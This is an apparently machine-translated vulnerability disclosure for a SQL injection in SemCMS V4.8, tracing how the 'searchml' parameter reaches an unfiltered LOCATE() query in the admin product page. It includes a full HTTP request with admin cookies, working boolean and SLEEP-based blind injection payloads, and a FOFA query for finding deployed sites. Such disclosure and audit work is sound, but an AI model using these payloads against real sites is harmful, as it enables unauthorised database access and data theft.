**The Semcm foreign trade website management system has locate() SQL injection**

**Vulnerability Overview: The Semcms foreign trade website management system has blind injection of the locate() function, which allows attackers to obtain sensitive database information through this vulnerability**

**Semcms portal website: http://www.sem-cms.com/**

**Affected version: PHP version of V4.8 (currently the latest)**

**Impact plugin: backend management interface ->comprehensive management module ->user management department ->editing**
**Source code download address: SemCms PHP, ASP version of foreign trade website [Multilingual] Free source code download - SemCms foreign trade website management system (sem cms. com)**

**FOFA Space Surveying: app="SEMCMS"**

![image-20240502192226297](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192226297.png)

1、 Code audit process:

1. Search for global SQL filtering components and locate the project source code/include/contorl. PHP

In the include directory of the project source code, there is a contorl. PHP file. When searching for the input_check_sql function in the file, you will find that it is a global SQL query string filtering function that uses regularization to match a series of commonly used characters in SQL statements, preg_match ('select | and | insert |=|% |<| between | update | \ '| \ * | union | intro | load_file | outfile/i', $sqlstr);
Select, and, insert,%,=,<, between, update, *, union, into, ', etc. are all filtered, and all SQL query statement strings will be passed as parameters to the $str variable before being called by the verify_str() function. When the user inputs, the verify_str() inner layer calls the input_check_sql() function for verification, which is like a global SQL statement validator.

![image-20240502192330247](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192330247.png)

2. I have previously audited the source code, and my previous approach was to use the data content returned by the database to the page rendering as disabled "=", combined with regularization and related functions to guess the database name and length. The difference in approach here is that I will first search for the locate() function to see if the parameters in the locate() function have been filtered for blind injection.
  Search globally for locate() in the project file

  ![image-20240502192353048](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192353048.png)

3. Go to the project filepath  /include/function.php

![image-20240502192421935](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192421935.png)

The prolmid() function in this file receives $ID and $db_conn and performs an SQL query, and the $ID is directly concatenated into the locate() function.



```php
1.function prolmid($ID,$db_conn){  
2.    $str="";
3.    $strs=""; 
4.    $query=$db_conn->query("select ID from sc_categories where LOCATE(',".$ID.",', category_path)>0 and category_open=1");
5.    while($row=mysqli_fetch_array($query)){  
6.      $str.= "LOCATE(',".$row['ID'].",', products_category)>0 or ";
7.    } 
8.      $strs ="(".rtrim($str,"or ").")";
9.      return $strs;
10.}
```



$db_conn is a connection pool, so don't worry. Let's focus on whether the parameter $ID is controllable and look for the function points that call the prommid() function.

![image-20240502192532563](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192532563.png)

It can be found that the function point for calling this function is located in/admin/SEMCMS-Products.php

![image-20240502192553265](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192553265.png)

Let's take a closer look and we can see that there are four types of situations based on whether the $CatID and $Searchp parameters are empty. All four types of situations call the palmid() function.

![image-20240502192610116](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192610116.png)

Here, in order to avoid the influence of other parameters, we enter the second logic ->$CatID is not empty, and $Searchp is empty.



```php
1.elseif($CatID!="" && $Searchp==""){
2.
3.     $flID=prolmid($CatID,$db_conn);
4.     $sql=$db_conn->query("select * from sc_products where languageID=".$_GET["lgid"]." and $flID order by ID desc  limit $limit_st,$page_num ");     
5.   
6.   }
```



We further track whether $CatID is controllable and the source from which it obtains parameters, and locate where this parameter is assigned an initial value.

![image-20240502192722033](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192722033.png)



Here, retrieve the request parameter searchml and determine if it is empty. If it is empty, assign $CatID to be empty.



```php
1.if (isset($_REQUEST["searchml"])){$CatID=$_REQUEST["searchml"];}else{$CatID="";}
```

Then we continue to track the parameter to see if it has any relevant parameter filtering, and then pass in the custom getstrip() function for processing.

![image-20240502192849131](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192849131.png)

Follow up on the getstrip() function, which is located in the project filepath /include/function. php

```php
1.function get_strp($id,$lgid,$flag,$db_conn) {
2.    global $strs;
3.    $result=$db_conn->query("select * from sc_categories where category_pid=$id and languageID=$lgid");
4.    if($result){//如果有子类 
5.        while ($row = mysqli_fetch_assoc($result)) { //循环记录集
6.         $xuanze='';
7.         $retArr =explode(',',$row['category_path']);
8.         $countd=count($retArr)-4;
9.         $kg="";
10.         $js="&nbsp;";
11.          for($i=0;$i<$countd;$i++) {
12.              $kg=$kg."-";
13.             if ($i==0){
14.                $js="&nbsp;&nbsp;|";
15.              }else{
16.                $js=$js."";
17.             }    
18.          } 
19.          if ($flag!=="0"){    
20.              $flid= explode(",", $flag);
21.             foreach ($flid as $value){
22.                 if ($row['ID']==$value){
23.                   $xuanze='selected="selected"';   
24.                 }
25.              } 
26.          }
27.            $strs .= "<option value=".$row['ID']." $xuanze>".$js.$kg."".$row['category_name'] ."&nbsp;&nbsp;</option>";
28.            get_strp($row['ID'],$lgid,$flag,$db_conn); //调用get_str()，将记录集中的id参数传入函数中，继续查询下级 
29.        } 
30.    } 
```

Here, $CatID is passed in as the third parameter (formal parameter is $flag), and after checking for non emptiness, the explode() function is used to split it into an array and match it with the ID field obtained from the SQL query after filtering. If successful, a lower level query is performed. No other filtering is performed on $CatID here.

![image-20240502192943182](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192943182.png)

Then directly pass in the prolmid() function.

![image-20240502192959442](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502192959442.png)

Looking at the included file introduced here, it is found that there is no contorl. PHP, and $CatId is directly concatenated into the locate() function without filtering, which can be obtained by passing parameters through searchml. Therefore, there is SQL injection present.

![image-20240502193021743](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193021743.png)

**2、 Verification process**

Using relevant function points

Backend homepage>Comprehensive management>Product management

Construct the data packet as follows

Tips: gatsby.com is a local domain name

```
POST /semcms/admin/SEMCMS_Products.php?lgid=1 HTTP/1.1
Host: gatsby.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://gatsby.com
Connection: close
Referer: http://gatsby.com/semcms/admin/SEMCMS_Products.php?lgid=1&indextjs=1
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=21232f297a57a5a743894a0e4a801fc3
Upgrade-Insecure-Requests: 1

searchml=64&search=
```

![image-20240502193203592](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193203592.png)

Enable MySQL monitoring and discover successful execution of SQL statements
Select ID from sc_categories where LOCATE (', 64,', category_path)>0 and category_open=1.

![image-20240502193221584](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193221584.png)

Change searchml to -1 and find no content echo.

![image-20240502193237792](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193237792.png)

Analyze SQL statement and return ID=64

![image-20240502193300066](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193300066.png)

There is a constraint in the SQL query LOCATE() function that returns relevant results

```sql
LOCATE (', 64,', category_path)>0
```

LOCATE (', 64,', category_path)>0 must require category_path to contain ', $searchml,' in order for the condition to be true for a valid query. Let's take a look at the data format in category_path

```
Select category_path from sc_categories
```

![image-20240502193359406](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193359406.png)

It can be observed that when we searchml=64, the locate() function exactly matches' 0,1,64, 'in the database with' 0,1,64, 'which means' 0,1,64,' contains', 64, ', so it is judged as a valid query with returned data. However, when we previously passed a parameter of -1, there was no data returned because', -1, 'was not matched by category_path.

![image-20240502193423053](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193423053.png)

We try to incorporate the AND logical symbol so that the previous substring's final result is' 0 ', which matches all results. When our payload is as follows.

```sql
-1 '+AND+'a'='a
```

At this point, all results have been returned

![image-20240502193505467](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193505467.png)

We checked the MySQL monitoring and successfully imported the payload.

Compare before and after using Payload

Payload not used, searchml=-1, condition judgment invalid

![image-20240502193555549](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193555549.png)

Using payload, searchml=-1 'AND' a '='a, the condition is successfully determined, and the underlying logic is
0 matches the following string 0, *

![image-20240502193615144](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193615144.png)

Attempt to construct a closed subquery delay using parentheses.

```sql
-1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))b) AND 'a'=
```

Delay sub queries twice.

![image-20240502193701583](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193701583.png)

Successfully imported controllable parameters at the database level.

![image-20240502193724111](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193724111.png)

Sqlmap validation.

![image-20240502193740203](C:\Users\24586\AppData\Roaming\Typora\typora-user-images\image-20240502193740203.png)